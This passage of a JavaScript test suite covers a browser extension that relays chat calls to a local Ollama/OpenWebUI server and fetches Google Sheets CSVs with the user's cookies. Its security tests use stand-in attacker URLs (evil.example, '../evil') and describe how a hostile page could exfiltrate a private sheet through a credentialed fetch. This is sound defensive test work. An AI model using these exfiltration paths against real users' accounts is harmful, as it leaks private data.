    const blocked = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }], model: "gpt-4o" } });
    assert.match(blocked.error, /blocked by the model filter/);
    const ok = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }], model: "qwen3:14b" } });
    assert.equal(ok.data, "ok");
});

test("model filter: an invalid regex fails OPEN (a typo doesn't brick every call)", async () => {
    const bg = loadBackground({
        config: baseConfig({ modelFilter: "([" }),   // not a valid regex
        onFetch: () => jsonResponse({ choices: [{ message: { content: "ok" } }] }),
    });
    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }], model: "gpt-4o" } });
    assert.equal(res.data, "ok", "invalid filter → no restriction, not a hard block");
});

test("model filter: LIST_MODELS hides non-matching models from callers", async () => {
    const bg = loadBackground({
        config: baseConfig({ modelFilter: "^qwen" }),
        onFetch: (call) => call.url === "http://host/api/models"
            ? jsonResponse({ data: [{ id: "qwen3:14b" }, { id: "gpt-4o" }, { id: "qwen2.5vl:7b" }] })
            : jsonResponse({ choices: [{ message: { content: "ok" } }] }),
    });
    const res = await bg.send({ type: "LIST_MODELS" });
    assert.deepEqual(res.data, ["qwen3:14b", "qwen2.5vl:7b"], "cloud model never surfaces to the caller");
});

test("model filter: SET_MODEL rejects an in-server model the whitelist excludes (with a clear reason)", async () => {
    const bg = loadBackground({
        config: baseConfig({ modelFilter: "^qwen" }),
        onFetch: (call) => call.url === "http://host/api/models"
            ? jsonResponse({ data: [{ id: "qwen3:14b" }, { id: "gpt-4o" }] })
            : jsonResponse({}),
    });
    // gpt-4o IS on the server, so it's not "unknown" — it's blocked by the filter, and
    // the error says so (the list stays unfiltered for validation to give this message).
    const res = await bg.send({ type: "SET_MODEL", payload: { model: "gpt-4o" } });
    assert.match(res.error, /blocked by the model filter/);
    assert.equal(bg.stored.model, baseConfig().model, "not persisted");
});

test("LIST_MODELS explains an empty server instead of route-hopping", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            // Valid route, valid response, zero models installed.
            assert.equal(call.url, "http://host/api/models");
            return jsonResponse({ data: [] });
        }
    });

    const res = await bg.send({ type: "LIST_MODELS" });
    assert.match(res.error, /no models installed/);
    assert.match(res.error, /ollama pull/);
    assert.equal(bg.calls.length, 1); // authoritative — no fallback probing
});

test("LIST_MODELS falls back across routes (HTML means wrong path)", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            if (call.url === "http://host/api/models") return htmlResponse(200);
            if (call.url === "http://host/v1/models") return htmlResponse(405);
            if (call.url === "http://host/api/tags") {
                return jsonResponse({ models: [{ name: "m1" }] });
            }
            assert.fail(`unexpected url ${call.url}`);
        }
    });

    const res = await bg.send({ type: "LIST_MODELS" });
    assert.deepEqual(res, { data: ["m1"], ollamaModels: ["m1"] });   // /api/tags → all local
});

test("LIST_MODELS marks Ollama-backed models (owned_by) vs external ones", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => jsonResponse({ data: [
            { id: "local:8b", owned_by: "ollama" },
            { id: "gpt-4o", owned_by: "openai" },
            { id: "arena", owned_by: "arena" },
        ] })
    });
    const res = await bg.send({ type: "LIST_MODELS" });
    assert.deepEqual(res.data, ["local:8b", "gpt-4o", "arena"]);
    assert.deepEqual(res.ollamaModels, ["local:8b"], "only the ollama-owned model is local");
});

test("LIST_MODELS reports ollamaModels: null when the source can't tell (/v1/models)", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            if (call.url === "http://host/api/models") return htmlResponse(200);
            if (call.url === "http://host/v1/models") return jsonResponse({ data: [{ id: "x" }] });
            assert.fail(`unexpected url ${call.url}`);
        }
    });
    const res = await bg.send({ type: "LIST_MODELS" });
    assert.deepEqual(res, { data: ["x"], ollamaModels: null });   // unknown, not "none"
});

test("LIST_SERVER_TOOLS returns the tool ids + their function specs (valid toolIds)", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            assert.equal(call.url, "http://host/api/v1/tools/");
            assert.equal(call.opts.headers.Authorization, "Bearer sk-test");
            return jsonResponse([
                {
                    id: "searxng_web_search",
                    name: "SearXNG Web Search",
                    meta: { description: "Search the web." },
                    specs: [{ name: "search", description: "Run a query.", parameters: { type: "object", properties: { q: { type: "string" } } } }],
                },
                { id: "server:weather", name: "Weather API", meta: { description: "OpenAPI server." } },
                { id: "server:mcp:files", name: "Files", meta: {} },
            ]);
        }
    });

    const res = await bg.send({ type: "LIST_SERVER_TOOLS" });
    assert.deepEqual(res.data.map(t => [t.id, t.kind]), [
        ["searxng_web_search", "local"],
        ["server:weather", "openapi"],
        ["server:mcp:files", "mcp"],
    ]);
    assert.deepEqual(res.data[0].functions, [
        { name: "search", description: "Run a query.", parameters: { type: "object", properties: { q: { type: "string" } } } },
    ]);
    // A proxied server lists as one entry; OpenWebUI resolves its functions only at call time.
    assert.deepEqual(res.data[1].functions, []);
});

test("LIST_SERVER_TOOLS returns [] on a non-OpenWebUI server (no such concept)", async () => {
    // Bare Ollama 404s the route; OpenWebUI itself answers unknown GETs with the SPA HTML.
    for (const response of [htmlResponse(404), htmlResponse(200)]) {
        const bg = loadBackground({ config: baseConfig(), onFetch: () => response });
        const res = await bg.send({ type: "LIST_SERVER_TOOLS" });
        assert.deepEqual(res, { data: [] }, "degrades to empty, not an error");
    }
});

test("LIST_MODELS ignores config overrides from page-originated messages", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            assert.ok(call.url.startsWith("http://host/"), `leaked to ${call.url}`);
            return jsonResponse({ data: [{ id: "a" }] });
        }
    });

    // sender.tab set = relayed from a web page: override must be ignored.
    const res = await bg.send(
        { type: "LIST_MODELS", payload: { chatUrl: "http://evil:9/api/chat/completions" } },
        { tab: { id: 1 } }
    );
    assert.deepEqual(res, { data: ["a"], ollamaModels: [] });
});

test("LIST_MODELS honors overrides from the popup (no sender.tab)", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            assert.ok(call.url.startsWith("http://other:1/"), `hit ${call.url}`);
            return jsonResponse({ data: [{ id: "a" }] });
        }
    });

    const res = await bg.send(
        { type: "LIST_MODELS", payload: { chatUrl: "http://other:1/api/chat/completions" } },
        {}
    );
    assert.deepEqual(res, { data: ["a"], ollamaModels: [] });
});

test("OLLAMA_UNLOAD evicts every loaded model with keep_alive 0", async () => {
    const generated = [];
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            if (call.url === "http://host/ollama/api/ps") {
                return jsonResponse({ models: [{ model: "a" }, { model: "b" }] });
            }
            if (call.url === "http://host/ollama/api/generate") {
                assert.equal(call.body.keep_alive, 0);
                generated.push(call.body.model);
                return jsonResponse({ done: true });
            }
            assert.fail(`unexpected url ${call.url}`);
        }
    });

    const res = await bg.send({ type: "OLLAMA_UNLOAD", payload: {} });
    assert.deepEqual(res, { data: ["a", "b"] });
    assert.deepEqual(generated, ["a", "b"]);
});

test("OLLAMA_PS reports loaded models with VRAM usage", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => jsonResponse({
            models: [
                { model: "a", size_vram: 21_400_000_000, size: 30_000_000_000, expires_at: "soon", context_length: 262_144 },
                // An older Ollama omits context_length entirely → null, never a bogus 0.
                { model: "b", size_vram: 2_100_000_000, size: 2_100_000_000, expires_at: "later" },
            ]
        })
    });

    const res = await bg.send({ type: "OLLAMA_PS", payload: {} });
    assert.deepEqual(res, { data: [
        { model: "a", vramGB: 21.4, sizeGB: 30, contextLength: 262_144, expiresAt: "soon" },
        { model: "b", vramGB: 2.1, sizeGB: 2.1, contextLength: null, expiresAt: "later" },
    ] });
});

// A tiny helper: drains microtasks/macrotasks so port messages settle.
const settle = () => new Promise((r) => setTimeout(r, 10));

test("streaming Port relays SSE deltas and finishes with the full content", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            assert.equal(call.body.stream, true);
            return streamResponse([
                'data: {"choices":[{"delta":{"role":"assistant"}}]}\n',
                'data: {"choices":[{"delta":{"content":"Hel"}}]}\n',
                'data: {"choices":[{"delta":{"content":"lo"}}]}\n',
                "data: [DONE]\n"
            ]);
        }
    });

    const client = bg.connect("LLM_STREAM");
    client.send({ payload: { messages: [{ role: "user", content: "hi" }] } });
    await settle();

    const deltas = client.messages.filter(m => m.type === "chunk").map(m => m.delta);
    const done = client.messages.find(m => m.type === "done");
    assert.deepEqual(deltas, ["Hel", "lo"]);
    assert.equal(done.content, "Hello");
});

test("streaming with toolIds retries the next mode when the first hands back", async () => {
    const modes = [];
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            modes.push(call.body.params.function_calling);
            // First mode: native-style hand-back — a tool_call, no content.
            if (modes.length === 1) {
                return streamResponse([
                    'data: {"choices":[{"delta":{"tool_calls":[{"index":0}]},"finish_reason":"tool_calls"}]}\n',
                    "data: [DONE]\n"
                ]);
            }
            // Second mode: the server runs the tool and streams the answer.
            return streamResponse([
                'data: {"choices":[{"delta":{"content":"done"}}]}\n',
                "data: [DONE]\n"
            ]);
        }
    });

    const client = bg.connect("LLM_STREAM");
    client.send({ payload: { messages: [{ role: "user", content: "go" }], toolIds: ["t"] } });
    await settle();

    assert.deepEqual(modes, ["legacy", "default"]);
    const deltas = client.messages.filter(m => m.type === "chunk").map(m => m.delta);
    assert.deepEqual(deltas, ["done"]);          // nothing emitted for the hand-back
    assert.equal(client.messages.find(m => m.type === "done").content, "done");
});

test("streaming surfaces errors as a port error message", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => htmlResponse(500)
    });

    const client = bg.connect("LLM_STREAM");
    client.send({ payload: { messages: [{ role: "user", content: "hi" }] } });
    await settle();

    const err = client.messages.find(m => m.type === "error");
    assert.ok(err, "expected an error message");
    assert.match(err.error, /HTTP 500/);
});

test("FETCH_LLM surfaces top-level sources alongside the reply", async () => {
    const srcs = [{ source: { name: "web/search" }, metadata: [{ source: "https://x.com" }] }];
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => jsonResponse({ choices: [{ message: { content: "hi" } }], sources: srcs })
    });

    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "q" }] } });
    assert.equal(res.data, "hi");
    assert.deepEqual(res.sources, srcs);
});

test("FETCH_LLM omits sources when there are none", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => jsonResponse({ choices: [{ message: { content: "hi" } }] })
    });

    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "q" }] } });
    assert.deepEqual(res, { data: "hi", model: "default-model" });   // resolved model rides along; no sources key on a plain chat
});

test("streaming delivers sources (their own SSE line) on the done message", async () => {
    const srcs = [{ source: { name: "web" }, metadata: [{ source: "https://x.com" }] }];
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => streamResponse([
            'data: {"choices":[{"delta":{"content":"hi"}}]}\n',
            'data: {"sources":' + JSON.stringify(srcs) + '}\n',
            "data: [DONE]\n"
        ])
    });

    const client = bg.connect("LLM_STREAM");
    client.send({ payload: { messages: [{ role: "user", content: "q" }] } });
    await settle();

    const done = client.messages.find(m => m.type === "done");
    assert.equal(done.content, "hi");
    assert.deepEqual(done.sources, srcs);
});

test("CAPTURE_TAB screenshots the sender's window and returns the data URL", async () => {
    const bg = loadBackground({ config: baseConfig(), onFetch: () => htmlResponse() });
    const res = await bg.send({ type: "CAPTURE_TAB", payload: {} }, { tab: { windowId: 7 } });

    assert.deepEqual(bg.captures[0], [7, { format: "png" }]); // targeted the sender's window
    assert.equal(res.data, "data:image/png;base64,SHOT");
});

test("CAPTURE_TAB surfaces a capture failure as an error", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => htmlResponse(),
        onCaptureTab: () => { throw new Error("cannot capture chrome:// page"); }
    });
    const res = await bg.send({ type: "CAPTURE_TAB", payload: {} }, { tab: { windowId: 1 } });
    assert.match(res.error, /cannot capture/);
});

test("SAVE_SESSION persists a session that GET_SESSION reads back", async () => {
    const bg = loadBackground({ config: baseConfig(), onFetch: () => jsonResponse({}) });
    const session = { hash: "abc123", messages: [{ role: "user", content: "hi" }], model: "m", save: true };

    const saved = await bg.send({ type: "SAVE_SESSION", payload: { hash: "abc123", session } });
    assert.deepEqual(saved, { data: true });

    const got = await bg.send({ type: "GET_SESSION", payload: { hash: "abc123" } });
    assert.deepEqual(got.data, session);

    const missing = await bg.send({ type: "GET_SESSION", payload: { hash: "nope" } });
    assert.equal(missing.data, null);
});

test("devtools panel: buffers debug events per tab, replays on connect, relays live, resets", () => {
    const bg = loadBackground({ config: baseConfig() });
    // Fire-and-forget: the ML_DEBUG_* handlers don't sendResponse, so we don't await —
    // they run synchronously inside the send() executor.
    const dbg = (n, id) => bg.send({ type: "ML_DEBUG_EVENT", event: { kind: "chat", n } }, { tab: { id } });

    // Events arrive for tab 7 BEFORE any panel is open → buffered. Tab 8 must not leak in.
    dbg(1, 7); dbg(2, 7); dbg(99, 8);

    // A panel opens for tab 7 → gets a replay burst of exactly tab 7's events, in order.
    const panel = bg.connect("ml-devtools");
    panel.send({ type: "ml-devtools-init", tabId: 7 });
    const replay = panel.messages.find(m => Array.isArray(m.replay));
    assert.ok(replay, "panel received a replay burst on connect");
    assert.deepEqual(replay.replay.map(e => e.n), [1, 2], "replay is tab 7's events, no tab-8 leak");

    // A live event now fans out to the connected panel.
    dbg(3, 7);
    const live = panel.messages.filter(m => m.__mlDebug);
    assert.equal(live.length, 1, "one live relay");
    assert.equal(live[0].__mlDebug.n, 3);

    // RESET clears the tab's buffer (fresh page) → a panel opened after replays nothing.
    bg.send({ type: "ML_DEBUG_RESET" }, { tab: { id: 7 } });
    const panel2 = bg.connect("ml-devtools");
    panel2.send({ type: "ml-devtools-init", tabId: 7 });
    assert.deepEqual(panel2.messages.find(m => Array.isArray(m.replay)).replay, [], "reset → nothing to replay");
});

test("ML_HL_REMOTE: the panel's hover-highlight is relayed to the inspected tab's content script", () => {
    // The DevTools panel can't reach the inspected page, so it sends ML_HL_REMOTE{tabId, ref} to the
    // background, which forwards it to that tab's shell via chrome.tabs.sendMessage — the reverse channel.
    // Fire-and-forget (no sendResponse), so DON'T await bg.send — the handler runs synchronously inside
    // send()'s executor and the tabs.sendMessage mock records synchronously (awaiting would hang: the
    // send() promise never resolves because the handler never calls its resolve).
    const bg = loadBackground({ config: baseConfig() });
    bg.send({ type: "ML_HL_REMOTE", tabId: 12, ref: { selector: "#go", index: 0 } });
    assert.equal(bg.tabMessages.length, 1, "one relay to the tab");
    assert.equal(bg.tabMessages[0][0], 12, "addressed to the inspected tab");
    assert.deepEqual(bg.tabMessages[0][1], { type: "ML_HL_REMOTE", ref: { selector: "#go", index: 0 } }, "the ref is forwarded verbatim");
    // A clear (ref:null) forwards too; a non-numeric tabId is ignored (no throw, no relay).
    bg.send({ type: "ML_HL_REMOTE", tabId: 12, ref: null });
    assert.deepEqual(bg.tabMessages[1][1], { type: "ML_HL_REMOTE", ref: null }, "a clear is relayed");
    bg.send({ type: "ML_HL_REMOTE", ref: { selector: "#x" } });
    assert.equal(bg.tabMessages.length, 2, "no tabId → not relayed");
});

test("START_RUN (surface 'devtools') fans a background run's step events to the PANEL port, not the page", async () => {
    // DevTools parity: a background-hosted run in devtools mode streams its agent-step events to the
    // panel via relayDebugEvent (the ml-devtools ports), NOT chrome.tabs.sendMessage (which the harness
    // doesn't even mock — so if the wrong branch ran, this would throw). A no-tool reply keeps it to a
    // single usage-only step, so no page delegation is needed.
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => jsonResponse({ choices: [{ message: { content: "done" } }], usage: { prompt_tokens: 10, completion_tokens: 2, total_tokens: 12 } }),
    });
    const panel = bg.connect("ml-devtools");
    panel.send({ type: "ml-devtools-init", tabId: 7 });
    await bg.send({ type: "START_RUN", payload: {
        runId: "run1", task: "x", systemPrompt: "sys", tools: [], model: "m", think: null,
        maxSteps: 5, autoApprovePython: false, autoApproveReadonly: false, surface: "devtools",
    } }, { tab: { id: 7 } });
    const steps = panel.messages.filter(m => m.__mlDebug && m.__mlDebug.kind === "agent-step");
    assert.ok(steps.length >= 1, "the run's agent-step events reached the panel via relayDebugEvent");
    assert.ok(steps.some(s => s.__mlDebug.usage && s.__mlDebug.usage.totalTokens === 12), "the usage step fanned to the panel");
});

test("CANCEL_RUN aborts a background run's in-flight model call → the run resolves cancelled", async () => {
    // The HUD's "Cancel agent run": abort the run's controller mid-generation. The loop threads the
    // signal into fetchLLM (kills the slow call) and converts the AbortError to a clean { cancelled }.
    let sawSignal = false;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => new Promise((_, reject) => {
            sawSignal = !!call.opts.signal;
            const abort = () => { const e = new Error("aborted"); e.name = "AbortError"; reject(e); };
            if (call.opts.signal.aborted) return abort();
            call.opts.signal.addEventListener("abort", abort);
        }),
    });
    const pending = bg.send({ type: "START_RUN", payload: {
        runId: "runC", task: "x", systemPrompt: "sys", tools: [], model: "m", think: null,
        maxSteps: 5, autoApprovePython: false, autoApproveReadonly: false, surface: "devtools",
    } }, { tab: { id: 8 } });
    await new Promise(r => setTimeout(r, 0));   // let the run reach its in-flight model call
    bg.send({ type: "CANCEL_RUN", payload: { runId: "runC" } });   // fire-and-forget (no response)
    const res = await pending;
    assert.equal(sawSignal, true, "the run's model fetch received the abort signal");
    assert.ok(res.data && res.data.cancelled, "the aborted run resolves as cancelled (not an error)");
});

test("CANCEL_RUN for an unknown run id is a harmless no-op", async () => {
    const bg = loadBackground({ config: baseConfig(), onFetch: () => jsonResponse({ choices: [{ message: { content: "ok" } }] }) });
    bg.send({ type: "CANCEL_RUN", payload: { runId: "ghost" } });   // nothing registered → no throw
    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }] }, requestId: "rz" });
    assert.equal(res.data, "ok", "a later request is unaffected");
});

test("RESUME_RUN continues a stored background run with its accumulated history (+ tab-ownership guard)", async () => {
    // Phase 2: after a background run settles, its history + payload are kept (bgRuns). A RESUME_RUN from
    // the SAME tab re-enters the loop from that history with a follow-up task; another tab can't, and an
    // unknown/evicted run reports an actionable error rather than silently starting fresh.
    const calls = [];
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            calls.push(call.body.messages.map(m => ({ role: m.role, content: m.content })));
            return jsonResponse({ choices: [{ message: { content: calls.length === 1 ? "first answer" : "second answer" } }] });
        },
    });
    const first = await bg.send({ type: "START_RUN", payload: {
        runId: "rr1", task: "first task", systemPrompt: "SYS", tools: [], model: "m", think: null,
        maxSteps: 5, autoApprovePython: false, autoApproveReadonly: false, surface: "off",
    } }, { tab: { id: 9 } });
    assert.equal(first.data.summary, "first answer");

    // Resume from the OWNING tab → continues with the prior history + the follow-up.
    const second = await bg.send({ type: "RESUME_RUN", payload: { runId: "rr1", task: "follow up" } }, { tab: { id: 9 } });
    assert.equal(second.data.summary, "second answer");
    const resumed = calls.at(-1);
    assert.equal(resumed[0].content, "SYS", "resume keeps the ORIGINAL system prompt (from stored history)");
    assert.equal(resumed[1].content, "first task");
    assert.ok(resumed.some(m => m.role === "assistant" && m.content === "first answer"), "the prior answer is in the resumed context");
    assert.equal(resumed.at(-1).content, "follow up", "the follow-up is the last user turn");

    // A DIFFERENT tab may NOT resume it (ownership guard).
    const wrongTab = await bg.send({ type: "RESUME_RUN", payload: { runId: "rr1", task: "steal" } }, { tab: { id: 99 } });
    assert.match(wrongTab.error, /another tab/);

    // An unknown / evicted run → actionable error, no run started.
    const ghost = await bg.send({ type: "RESUME_RUN", payload: { runId: "nope", task: "x" } }, { tab: { id: 9 } });
    assert.match(ghost.error, /No resumable run/);
});

test("START_RUN with resumeMessages continues that history, returns the final messages, and does NOT re-announce", async () => {
    // The createAgent-handle path: the page sends its prior control.messages so the background CONTINUES it
    // (fixing 'a.messages empty' + 'run() again resets the session'). The final history rides back so the
    // handle stays authoritative; a continuation must NOT re-emit `agent` (that wiped the sidebar session).
    const calls = [], tabEvents = [];
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => { calls.push(call.body.messages.map(m => ({ role: m.role, content: m.content }))); return jsonResponse({ choices: [{ message: { content: "answer" } }] }); },
        onTabMessage: (_tabId, msg) => { if (msg?.type === "ML_DEBUG_TO_PAGE") tabEvents.push(msg.event); },
    });
    const prior = [{ role: "system", content: "SYS" }, { role: "user", content: "first" }, { role: "assistant", content: "ans1" }];
    const res = await bg.send({ type: "START_RUN", payload: {
        runId: "rc1", task: "second", systemPrompt: "SYS", tools: [], model: "m", think: null,
        maxSteps: 5, autoApprovePython: false, autoApproveReadonly: false, surface: "off", resumeMessages: prior,
    } }, { tab: { id: 3 } });

    assert.deepEqual(calls.at(-1), [...prior, { role: "user", content: "second" }], "continued from the prior history + the new task");
    assert.ok(Array.isArray(res.messages) && res.messages.some(m => m.content === "second"), "the response returns the final messages (for control.messages sync)");
    assert.ok(res.messages.some(m => m.role === "assistant" && m.content === "answer"), "…including the new answer");
    assert.ok(!tabEvents.some(e => e.kind === "agent"), "a continuation does NOT re-announce the session (no sidebar reset)");
    assert.ok(tabEvents.some(e => e.kind === "agent-result"), "but the result IS emitted");
});

test("INJECT_MESSAGE steers a RUNNING background run (drained at the next step boundary) + ownership guard", async () => {
    const calls = [];
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            calls.push(call.body.messages.map(m => ({ role: m.role, content: m.content })));
            // step 1 → a tool call (a boundary to inject at); step 2 → the final answer.
            return calls.length === 1
                ? jsonResponse({ choices: [{ message: { content: "", tool_calls: [{ id: "c1", type: "function", function: { name: "noop", arguments: "{}" } }] } }] })
                : jsonResponse({ choices: [{ message: { content: "done" } }] });
        },
        onTabMessage: async (_tabId, msg) => {
            if (msg?.type === "RUN_TOOL_IN_PAGE" && !msg.payload?.renderOnly && !msg.payload?.readonlyTry && !msg.payload?.precheck) {
                // A wrong tab may NOT steer (ownership guard); the owning tab may.
                const bad = await bg.send({ type: "INJECT_MESSAGE", payload: { runId: "inj1", text: "NOPE" } }, { tab: { id: 99 } });
                assert.equal(bad.data, false, "another tab can't inject into the run");
                const ok = await bg.send({ type: "INJECT_MESSAGE", payload: { runId: "inj1", text: "STEER ME" } }, { tab: { id: 5 } });
                assert.equal(ok.data, true, "the owning tab injects");
                return { result: "noop ok" };
            }
            return undefined;
        },
    });
    await bg.send({ type: "START_RUN", payload: {
        runId: "inj1", task: "go", systemPrompt: "S",
        tools: [{ name: "noop", requiresApproval: false, description: "", parameters: {}, capabilities: [] }],
        model: "m", think: null, maxSteps: 5, autoApprovePython: false, autoApproveReadonly: false, surface: "devtools",
    } }, { tab: { id: 5 } });

    assert.ok(calls.at(-1).some(m => m.role === "user" && m.content === "STEER ME"), "the mid-run injected message reached the model at the next step");
    // Unknown / finished run → no-op (the page's run()-flush picks up anything too late).
    const ghost = await bg.send({ type: "INJECT_MESSAGE", payload: { runId: "gone", text: "x" } }, { tab: { id: 5 } });
    assert.equal(ghost.data, false, "injecting into a finished/unknown run is a harmless no-op");
});

test("START_RUN offsets emitted step/seq by stepBase/seqBase and returns the run's extents (multi-turn sidebar)", async () => {
    // A createAgent handle's later turns send stepBase/seqBase so the background's emitted step/seq continue
    // past prior turns — otherwise turn N's step 1 collides with turn 1's and the sidebar chat log scrambles.
    const events = [];
    let n = 0;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => (++n === 1
            ? jsonResponse({ choices: [{ message: { content: "", tool_calls: [{ id: "c1", type: "function", function: { name: "noop", arguments: "{}" } }] } }] })
            : jsonResponse({ choices: [{ message: { content: "done" } }] })),
        onTabMessage: (_t, msg) => {
            if (msg?.type === "ML_DEBUG_TO_PAGE") events.push(msg.event);
            if (msg?.type === "RUN_TOOL_IN_PAGE" && !msg.payload?.renderOnly && !msg.payload?.readonlyTry && !msg.payload?.precheck) return { result: "ok" };
            return undefined;
        },
    });
    const res = await bg.send({ type: "START_RUN", payload: {
        runId: "off1", task: "go", systemPrompt: "S", tools: [{ name: "noop", requiresApproval: false, description: "", parameters: {}, capabilities: [] }],
        model: "m", think: null, maxSteps: 5, autoApprovePython: false, autoApproveReadonly: false, surface: "devtools",
        stepBase: 10, seqBase: 5,
    } }, { tab: { id: 3 } });

    const steps = events.filter(e => e.kind === "agent-step");
    assert.ok(steps.length && steps.every(e => e.step > 10), "every emitted step is offset past stepBase (10)");
    assert.ok(steps.some(e => e.seq != null && e.seq > 5), "the tool step's seq is offset past seqBase (5)");
    // The run's EMITTED extents ride back so the page advances its bases past them (the final-answer step
    // emits no event here → max emitted step is 1, the tool step; one tool call → seq 1).
    assert.equal(res.stepCount, 1, "returns the run's max emitted step");
    assert.equal(res.seqCount, 1, "returns the run's max emitted seq (one tool call)");
});

// ---- FETCH_SHEET: credentialed Google Sheets CSV export ----

test("FETCH_SHEET returns the CSV body, fetched with the user's Google cookies", async () => {
    let opts = null;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => { opts = call.opts; return { ok: true, status: 200, headers: { get: (k) => /content-disposition/i.test(k) ? 'attachment; filename="Quarterly Sales - Sheet1.csv"' : "text/csv" }, text: async () => "Rep,Q1\nAda,120\n" }; },
    });
    const res = await bg.send({ type: "FETCH_SHEET", payload: { url: "https://docs.google.com/spreadsheets/d/A/export?format=csv&gid=0" } });
    assert.equal(res.data.csv, "Rep,Q1\nAda,120\n");
    assert.equal(res.data.name, "Quarterly Sales", "the sheet TITLE from Content-Disposition (tab + .csv stripped)");
    assert.equal(opts.credentials, "include", "credentialed so a private sheet the user can see works");
});

test("FETCH_SHEET_TITLE: a HEAD request returns just the sheet title (spreadsheet name, tab stripped)", async () => {
    let call = null;
    const bg = loadBackground({
        config: baseConfig(),
        // The REAL Google header: a space-STRIPPED ASCII filename= AND the UTF-8 filename* (with spaces).
        // We must prefer filename* — otherwise "quarterly sales" reads as "quarterlysales".
        onFetch: (c) => { call = c; return { ok: true, headers: { get: (k) => /content-disposition/i.test(k) ? `attachment; filename="quarterlysales-Sheet1.csv"; filename*=UTF-8''quarterly%20sales%20-%20Sheet1.csv` : "" }, text: async () => "" }; },
    });
    const res = await bg.send({ type: "FETCH_SHEET_TITLE", payload: { id: "ABC123_-x" } });
    assert.equal(res.data, "quarterly sales", "filename* wins (spaces kept), ' - Sheet1' tab stripped — NOT the stripped 'quarterlysales'");
    assert.equal(call.opts.method, "HEAD", "HEAD — headers only, no sheet body downloaded pre-approval");
    assert.equal(call.opts.credentials, "include");
    // A bad id is refused WITHOUT fetching (the host-locked guard).
    const bad = await bg.send({ type: "FETCH_SHEET_TITLE", payload: { id: "../evil" } });
    assert.equal(bad.data, null);
});

test("FETCH_SHEET REFUSES a non-Sheets URL without fetching (the credentialed-fetch guard)", async () => {
    // The approval gate is client-side; a hostile page can post FETCH_SHEET raw. This background
    // check is the only thing stopping a cookie-authenticated read of an arbitrary URL.
    let fetched = false;
    const bg = loadBackground({ config: baseConfig(), onFetch: () => { fetched = true; return { ok: true, status: 200, headers: { get: () => "text/csv" }, text: async () => "x" }; } });
    for (const url of ["https://evil.example/steal", "https://docs.google.com/document/d/abc/export", "https://accounts.google.com/o/oauth2/auth"]) {
        const res = await bg.send({ type: "FETCH_SHEET", payload: { url } });
        assert.match(res.error, /only Google Sheets CSV-export URLs/, `refused: ${url}`);
    }
    assert.equal(fetched, false, "no credentialed fetch ever issued for a disallowed URL");
});

test("FETCH_SHEET: an HTML login page (not signed in / no access) → an authenticate-and-retry error", async () => {
    // When the user lacks access, Google redirects the CSV export to an HTML sign-in page.
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => ({ ok: true, status: 200, headers: { get: () => "text/html" }, text: async () => "<!doctype html><html>Sign in</html>" }),
    });
    const res = await bg.send({ type: "FETCH_SHEET", payload: { url: "https://docs.google.com/spreadsheets/d/A/export?format=csv&gid=0" } });
    assert.equal(res.data, undefined);
    assert.match(res.error, /Tell the USER to open the sheet's link/);
});

// ---- SECURITY REGRESSIONS: consent must be enforced at the BACKGROUND choke point, not only the ----
// ---- (bypassable) client-side agent loop. These are `todo` — they encode the DESIRED secure behavior ----
// ---- and FAIL today (demonstrating the live holes). The hardening pass in ----
// ---- docs/spec/CHOKEPOINT_CONSENT_SPEC.md makes them pass; drop `todo` then. See background.ts. ----

test("SECURITY (FETCH_SHEET): a non-whitelisted page must NOT read an arbitrary sheet, credentialed, unapproved", async () => {
    // THE HOLE (this test fails today): the SHEET_URL_OK host-lock stops general SSRF, but within the
    // Google-Sheets shape the ID is page-controlled and the fetch is credentialed — so a hostile page that
    // knows a private sheet's id exfiltrates it with the user's cookies, with NO unforgeable approval (the
    // per-sheet grant lives only in the client-side loop). The fix must REFUSE this and never send cookies.
    let opts = null;
    const bg = loadBackground({
        config: baseConfig(),   // evil.example is NOT in pageApprovalDomains
        onFetch: (c) => { opts = c.opts; return { ok: true, status: 200, headers: { get: (k) => /content-disposition/i.test(k) ? 'attachment; filename="Private Budget - Sheet1.csv"' : "text/csv" }, text: async () => "Name,SSN\nAda,111-22-3333\n" }; },
    });
    const res = await bg.send(
        { type: "FETCH_SHEET", payload: { url: "https://docs.google.com/spreadsheets/d/VICTIM_SHEET_ID/export?format=csv&gid=0" } },
        { tab: { id: 9, url: "https://evil.example/attack" } });   // sender.tab set = a page; origin NOT whitelisted, sheet NOT approved
    assert.ok(res.error && /not (approved|whitelisted)|refus|consent/i.test(res.error),
        `a non-whitelisted page with an unapproved sheet must be refused — today it leaked: ${JSON.stringify(res.data)}`);
    assert.notEqual(opts?.credentials, "include", "must not spend the user's Google cookies on an unapproved sheet");
});

